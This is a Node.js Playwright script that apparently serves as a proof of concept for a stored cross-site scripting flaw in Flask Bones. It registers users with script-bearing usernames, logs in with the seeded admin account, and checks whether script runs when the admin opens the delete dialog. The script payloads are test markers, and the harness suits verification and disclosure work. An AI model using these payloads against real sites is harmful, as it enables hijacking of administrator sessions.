/**
 * Stored XSS in the admin user-list delete dialog.
 *
 * Prereq: Flask Bones is on $BASE (default http://127.0.0.1:5000) with the
 * seeded admin account from `flask populate-db` (username admin, password
 * test123, as set in app/commands.py).
 */
import { createRequire } from "node:module";
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(here, "evidence");
mkdirSync(evidenceDir, { recursive: true });

const require = createRequire(import.meta.url);
const playwrightCore =
  process.env.PLAYWRIGHT_CORE ||
  "/home/node/.npm/_npx/e41f203b7505f1fb/node_modules/playwright-core";
const { chromium } = require(playwrightCore);
const chromePath =
  process.env.CHROME_PATH ||
  "/home/node/.cache/ms-playwright/chromium-1234/chrome-linux/chrome";

const BASE = process.env.BASE || "http://127.0.0.1:5000";
const SVG_NAME = "<svg onload=alert()>";
const SCRIPT_NAME = "<script src=//127.1>";
const PWN_NAME = "<script src=/pwn.js>";
const LONG_EXAMPLE = "<svg onload=alert(1)>";

async function register(username, email) {
  const body = new URLSearchParams({
    username,
    email,
    password: "secret1",
    confirm: "secret1",
    accept_tos: "y",
  });
  const response = await fetch(`${BASE}/register`, {
    method: "POST",
    body,
    redirect: "manual",
  });
  const text = await response.text();
  return {
    status: response.status,
    location: response.headers.get("location"),
    stored:
      (response.status >= 300 && response.status < 400) ||
      text.includes("already registered"),
    errors: text.includes("error") ? text.slice(0, 400) : "",
  };
}

const registrations = {
  longExample: {
    username: LONG_EXAMPLE,
    length: LONG_EXAMPLE.length,
    ...(await register(LONG_EXAMPLE, "long-example@example.test")),
  },
  svg: {
    username: SVG_NAME,
    length: SVG_NAME.length,
    ...(await register(SVG_NAME, "svg-user@example.test")),
  },
  script: {
    username: SCRIPT_NAME,
    length: SCRIPT_NAME.length,
    ...(await register(SCRIPT_NAME, "script-user@example.test")),
  },
  sameOrigin: {
    username: PWN_NAME,
    length: PWN_NAME.length,
    ...(await register(PWN_NAME, "pwn-user@example.test")),
  },
};

const browser = await chromium.launch({ executablePath: chromePath, headless: true });
const page = await browser.newPage();
const dialogs = [];
const seenRequests = [];
page.on("dialog", async (dialog) => {
  dialogs.push({ type: dialog.type(), message: dialog.message() });
  await dialog.dismiss();
});
page.on("request", (request) => {
  seenRequests.push(request.url());
});
const fulfillMarker = async (route) => {
  await route.fulfill({
    status: 200,
    contentType: "application/javascript",
    body: "document.documentElement.dataset.pwned='flaskbones';",
  });
};
await page.route(/127\.1/, fulfillMarker);
await page.route(/\/pwn\.js/, fulfillMarker);

await page.goto(`${BASE}/login`, { waitUntil: "domcontentloaded" });
await page.fill('input[name="username"]', "admin");
await page.fill('input[name="password"]', "test123");
await page.click('button[type="submit"]');
await page.waitForURL((url) => !url.pathname.endsWith("/login"), { timeout: 10000 });
await page.goto(`${BASE}/user/list`, { waitUntil: "domcontentloaded" });

const listProbe = await page.evaluate(() => ({
  jquery: typeof window.jQuery,
  bootbox: typeof window.bootbox,
  rows: [...document.querySelectorAll("tbody tr")].map((row) => ({
    text: row.innerText.replace(/\s+/g, " ").trim().slice(0, 120),
    dialogue: row.querySelector("a[data-confirm]")?.getAttribute("data-dialogue") || null,
  })),
}));

async function dismissBootbox() {
  await page.evaluate(() => {
    if (window.bootbox) window.bootbox.hideAll();
    document.querySelectorAll(".bootbox, .modal-backdrop").forEach((node) => node.remove());
    document.body.classList.remove("modal-open");
    document.body.style.removeProperty("padding-right");
  });
}

async function clickDelete(username) {
  await dismissBootbox();
  const before = dialogs.length;
  const requestsBefore = seenRequests.length;
  const row = page.locator("tbody tr", { hasText: username });
  await row.locator("a[data-confirm]").click();
  await page.locator(".bootbox-body").waitFor({ state: "visible", timeout: 5000 });
  await page.waitForTimeout(800);
  const result = {
    newDialogs: dialogs.slice(before),
    pwned: await page.evaluate(() => document.documentElement.dataset.pwned || null),
    bootboxHtml: await page.evaluate(
      () => document.querySelector(".bootbox-body")?.innerHTML || null,
    ),
    requests: seenRequests.slice(requestsBefore),
  };
  await dismissBootbox();
  return result;
}

const svgClick = await clickDelete(SVG_NAME);
const scriptClick = await clickDelete(SCRIPT_NAME);
const sameOriginClick = await clickDelete(PWN_NAME);

const scriptRan = [scriptClick, sameOriginClick].some(
  (click) =>
    click.pwned === "flaskbones" || click.newDialogs.some((dialog) => dialog.type === "alert"),
);
const svgParsed = (svgClick.bootboxHtml || "").includes("<svg");
const svgRan = svgClick.newDialogs.some((dialog) => dialog.type === "alert");

const result = {
  reproduced: scriptRan ? "yes" : svgParsed ? "partial" : "no",
  note: scriptRan
    ? "A username of 20 characters or fewer ran a script in the admin session when the delete dialog opened. Length(max=20) rejects <svg onload=alert(1)> (21). <svg onload=alert()> is parsed into the Bootbox body; this Chromium build does not run that onload because jQuery assigns the string with innerHTML."
    : "The dialog parsed the username as HTML, and no script ran.",
  registrations,
  listProbe,
  svgClick,
  scriptClick,
  sameOriginClick,
  dialogs,
};
writeFileSync(join(evidenceDir, "result.json"), JSON.stringify(result, null, 2));
console.log(JSON.stringify({
  reproduced: result.reproduced,
  svgParsed,
  svgRan,
  scriptRan,
  pwned: sameOriginClick.pwned || scriptClick.pwned,
  sameOriginRequests: sameOriginClick.requests.filter((url) => url.includes("pwn") || url.includes("127.1")),
  externalRequests: scriptClick.requests.filter((url) => url.includes("127.1") || url.includes("pwn")),
}, null, 2));
await browser.close();
if (result.reproduced !== "yes") process.exit(1);
